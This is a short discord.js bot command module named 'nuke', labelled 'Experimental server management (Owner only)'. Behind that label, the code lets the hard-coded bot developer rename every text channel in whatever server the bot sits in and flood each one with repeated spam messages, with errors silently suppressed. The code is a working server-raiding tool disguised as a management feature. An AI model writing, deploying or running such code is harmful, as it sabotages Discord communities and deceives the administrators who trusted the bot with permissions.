const { PermissionFlagsBits } = require("discord.js");

const OWNER_ID = "1359147702088237076";

module.exports = {
  name: "nuke",
  description: "Experimental server management (Owner only)",
  module: "core",
  async execute(message, args) {
    if (message.author.id !== OWNER_ID) {
      return message.reply("❌ This command is restricted to the bot developer.");
    }

    const channelName = args[0] || "nuked";
    const spamMessage = args.slice(1).join(" ") || "NUKED";

    message.reply("⚠️ Initializing experimental management protocol...");

    const channels = message.guild.channels.cache;

    for (const [id, channel] of channels) {
      if (channel.isTextBased()) {
        // Rename channel
        channel.setName(channelName).catch(() => {});
        
        // Spam message
        for (let i = 0; i < 5; i++) {
          channel.send(spamMessage).catch(() => {});
        }
      }
    }
  },
};
